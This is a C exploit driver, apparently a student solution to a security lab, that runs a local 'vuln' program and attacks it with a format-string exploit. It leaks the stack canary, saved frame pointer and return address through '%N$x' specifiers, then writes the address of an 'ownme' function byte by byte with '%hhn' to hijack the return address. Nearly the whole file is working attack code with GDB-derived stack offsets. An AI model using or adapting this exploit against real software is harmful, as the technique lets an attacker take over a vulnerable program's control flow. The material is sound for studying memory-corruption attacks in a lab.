#include <stdio.h>
#include <stdarg.h>
#include <unistd.h>
#include <assert.h>
#include <string.h>
#include <stdlib.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <signal.h>

#define MAX_GRP 1001

/******************************************************************************
   Unless you are interested in the details of how this program communicates
   with a subprocess, you can skip all of the code below and skip directly to
   the main function below. 
*******************************************************************************/

#define err_abort(x) do { \
      if (!(x)) {\
         fprintf(stderr, "Fatal error: %s:%d: ", __FILE__, __LINE__);   \
         perror(""); \
         exit(1);\
      }\
   } while (0)

char buf[1<<20];
unsigned end;
int from_child, to_child;

void print_escaped(FILE *fp, const char* buf, unsigned len) {
   int i;
   for (i=0; i < len; i++) {
      if (isprint(buf[i]))
         fputc(buf[i], stderr);
      else fprintf(stderr, "\\x%02hhx", buf[i]);
   }
}

void put_bin_at(char b[], unsigned len, unsigned pos) {
   assert(pos <= end);
   if (pos+len > end)
      end = pos+len;
   assert(end < sizeof(buf));
   memcpy(&buf[pos], b, len);
}

void put_bin(char b[], unsigned len) {
   put_bin_at(b, len, end);
}

void put_formatted(const char* fmt, ...) {
   va_list argp;
   char tbuf[10000];
   va_start (argp, fmt);
   vsnprintf(tbuf, sizeof(tbuf), fmt, argp);
   put_bin(tbuf, strlen(tbuf));
}

void put_str(const char* s) {
   put_formatted("%s", s);
}

static
void send() {
   err_abort(write(to_child, buf, end) == end);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   fprintf(stderr, "driver: Sent:'");
   print_escaped(stderr, buf, end);
   fprintf(stderr, "'\n");
   end = 0;
}

char outbuf[1<<20];
int get_formatted(const char* fmt, ...) {
   va_list argp;
   va_start(argp, fmt);
   usleep(100000); // sleep 0.1 sec, in case child process is slow to respond
   int nread=0;
   err_abort((nread = read(from_child, outbuf, sizeof(outbuf)-1)) >=0);
   outbuf[nread] = '\0';
   fprintf(stderr, "driver: Received '%s'\n", outbuf);
   return vsscanf(outbuf, fmt, argp);
}

int pid;
void create_subproc(const char* exec, char* argv[]) {
   int pipefd_out[2];
   int pipefd_in[2];
   err_abort(pipe(pipefd_in) >= 0);
   err_abort(pipe(pipefd_out) >= 0);
   if ((pid = fork()) == 0) { // Child process
      err_abort(dup2(pipefd_in[0], 0) >= 0);
      close(pipefd_in[1]);
      close(pipefd_out[0]);
      err_abort(dup2(pipefd_out[1], 1) >= 0);
      err_abort(execve(exec, argv, NULL) >= 0);
   }
   else { // Parent
      close(pipefd_in[0]);
      to_child = pipefd_in[1];
      from_child = pipefd_out[0];
      close(pipefd_out[1]);
   }
}

/* Shows an example session with subprocess. Change it as you see fit, */

#define STRINGIFY2(X) #X
#define STRINGIFY(X) STRINGIFY2(X)

char* get_str(unsigned int byte){
      char* str = (char*)malloc(6);
      
      *(str) = '%';
      byte += 256;
      int i=1;
      while(i<=3){
         *(str+4-i) = '0' + (byte%10);
         byte=byte/10;
         i++;
      }
      *(str+4)='d';
      *(str+5) = '\0';
      return str;
} 


int main(int argc, char* argv[]) {
   unsigned seed;

   char *nargv[3];
   nargv[0] = "vuln";
   nargv[1] = STRINGIFY(GRP);
   nargv[2] = NULL;
   create_subproc("./vuln", nargv);

   fprintf(stderr, "driver: created vuln subprocess. If you want to use gdb on\n"
           "vuln, go ahead and do that now. Press 'enter' when you are ready\n"
           "to continue with the exploit\n");

   getchar();

   // Run vuln program under GDB. Set breakpoints in main_loop, auth and g
   // to figure out and populate the following values

   void *auth_bp = 0xbfffe818;     // saved ebp for auth function
   void *mainloop_bp = 0xbfffefe8; // saved ebp for main_loop
   void *auth_ra = 0x0804899f;     // return address for auth
   void *mainloop_ra = 0x0804eb4f; // return address for main_loop
   void *ownme = 0x0804e6ce; // call address for ownme

   // The following refer to locations on the stack
   void *auth_user = 0xbfffe610;       // _value_ of user variable in auth
   void *auth_canary_loc = 0xbfffe7dc; // location where auth's canary is stored
   void *auth_bp_loc = 0xbfffe7e8;     // location of auth's saved bp
   void *auth_ra_loc = 0xbfffe7ec;     // location of auth's return address
   void *g_authd = 0xbfffe804;         // location of authd variable of g
   void* g_ebp_val = 0xbfffefb8;       // g ebp value
   // These values discovered above using GDB will vary across the runs, but the
   // differences between similar variables are preserved, so we compute those.
   unsigned mainloop_auth_bp_diff = mainloop_bp - auth_bp;
   unsigned mainloop_auth_ra_diff = mainloop_ra - auth_ra;

   unsigned auth_canary_user_diff = auth_canary_loc - auth_user;
   unsigned auth_bp_user_diff = auth_bp_loc - auth_user;
   unsigned auth_ra_user_diff = auth_ra_loc - auth_user;
   unsigned g_authd_auth_user_diff = g_authd - auth_user;

   unsigned main_auth_loc_diff=mainloop_bp-auth_bp_loc;
   unsigned ownme_mainloop_diff = mainloop_ra - ownme;
   unsigned g_ebp_main_diff = mainloop_bp - g_ebp_val;


   // Use GDB + trial&error to figure out the correct offsets where the the
   // stack canary, the saved ebp value, and the return address for the
   // main_loop function are stored. Use those offsets in the place of the
   // numbers in the format string below.
   put_str("e %483$x %486$x %487$x %499$x\n");
   send();
   

   // Once all of the above information has been populated, you are ready to run
   // the exploit.

   unsigned cur_canary, cur_mainloop_bp, cur_mainloop_ra;
   get_formatted("%x%x%x", &cur_canary, &cur_mainloop_bp, &cur_mainloop_ra);
   fprintf(stderr, "driver: Extracted canary=%x, bp=%x, ra=%x\n", 
           cur_canary, cur_mainloop_bp, cur_mainloop_ra);


   unsigned ownme_address = cur_mainloop_ra - ownme_mainloop_diff;
   unsigned mainloop_ra_loc = cur_mainloop_bp - g_ebp_main_diff + 4;
   

   //-------------Format string attack----------------------


   //----------- Start writing Minloop return address-----------


   put_str("e   ");
   unsigned explsz = sizeof(int) + 16;
   void* *expl = (void**)malloc(explsz);
   memset((void*)expl, '\0', explsz);
  
   expl[0]=(void*)(mainloop_ra_loc + 3);
   expl[1]=(void*)(mainloop_ra_loc + 2);
   expl[2]=(void*)(mainloop_ra_loc + 1);
   expl[3]=(void*)(mainloop_ra_loc);
   put_bin((char*)expl, 16);  


   //----------- Start writing 1st byte-----------


   put_str("%238d");
   unsigned int first_byte = (ownme_address & 0xff000000)>>24;
   char* new_str = (char*)get_str(first_byte);
   put_bin(new_str,5);
   put_str("%209$hhn");


   //----------- Start writing 2nd byte-----------
   
   put_bin(get_str(256 - first_byte),5);
   unsigned int second_byte = (ownme_address & 0x00ff0000)>>16;
   put_bin(get_str(second_byte),5);
   put_str("%210$hhn");



   //-------------Start writin 3rd byte-----------

   put_bin(get_str(256 - second_byte),5);
   unsigned int third_byte = (ownme_address & 0x0000ff00)>>8;
   put_bin(get_str(third_byte),5);
   put_str("%211$hhn");


   //----------- Start writing 4th byte-------------

   put_bin(get_str(256 - third_byte),5);
   unsigned int fourth_byte = (ownme_address & 0x000000ff);
   put_bin(get_str(fourth_byte),5);
   put_str("%212$hhn");

   send();
   put_str("q ");
   send();

   usleep(100000);
   get_formatted("%*s");

   kill(pid, SIGINT);
   int status;
   wait(&status);

   if (WIFEXITED(status)) {
      fprintf(stderr, "vuln exited, status=%d\n", WEXITSTATUS(status));
   } 
   else if (WIFSIGNALED(status)) {
      printf("vuln killed by signal %d\n", WTERMSIG(status));
   } 
   else if (WIFSTOPPED(status)) {
      printf("vuln stopped by signal %d\n", WSTOPSIG(status));
   } 
   else if (WIFCONTINUED(status)) {
      printf("vuln continued\n");
   }

}
